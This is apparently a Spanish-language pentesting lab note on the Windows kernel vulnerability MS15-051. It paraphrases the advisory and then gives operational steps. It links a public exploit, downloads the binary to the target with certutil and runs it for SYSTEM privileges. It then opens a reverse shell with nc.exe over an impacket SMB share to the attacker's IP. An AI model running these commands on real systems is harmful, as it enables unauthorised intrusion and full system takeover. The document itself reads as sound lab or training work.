Las vulnerabilidades en los controladores en modo kernel de Windows podrían permitir la divulgación de información. 
Esta actualización de seguridad resuelve vulnerabilidades en Windows, Microsoft .NET Framework, Microsoft Office, Microsoft Lync y Microsoft Silverlight. La más grave de estas vulnerabilidades podría permitir uno de los siguientes escenarios:

* Ejecución remota de código si un usuario abre un documento especialmente diseñado o va a una página web que no es de confianza que contiene fuentes TrueType incrustadas
* Elevación de privilegios si un atacante inicia sesión localmente y ejecuta código arbitrario en modo kernel. Un atacante podría entonces realizar las siguientes acciones:
	* Instalar programas
	* Ver, cambiar o eliminar datos
	* Cree nuevas cuentas que tengan todos los derechos de usuario.

Un atacante debe tener credenciales de inicio de sesión válidas y poder iniciar sesión localmente para aprovechar esta vulnerabilidad. La vulnerabilidad no puede ser explotada de forma remota o por usuarios anónimos.

Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051

> Descargar fichero .zip y descomprimir con unzip.
> Compartir fichero desde un servicio web en nuestra máquina local:
> `python -m SimpleHTTPServer 80`
> Transferir el fichero .exe correspondiente a la arquitectura de la máquina.
> `mkdir C:\Windows\Temp\Test`
> `certutil.exe -f -urlcache -split http://10.10.16.109/ms15-051x64.exe ms15-051x64.exe`
> Ejecutar:
> `C:\Windows\Temp\Test\ms15-051x64.exe whoami`
> Obtener una reverse shell como nt authority/system:
> Montar un servidor SMB con impacket en el equipo local donde se estará compartiendo el binario de nc.exe --> `impacket-smbserver smbFolder $(pwd) -smb2support`
> Poner puerto en escucha en equipo local con netcat --> `rlwrap nc -nlvp 443`
> Hacer uso del binario nc.exe para entablar una reverse shell desde el equipo remoto  gracias a ms15-051x64.exe --> `C:\Windows\Temp\Test\ms15-051x64.exe "\\10.10.16.109\smbFolder\nc.exe -e cmd 10.10.16.109 443"`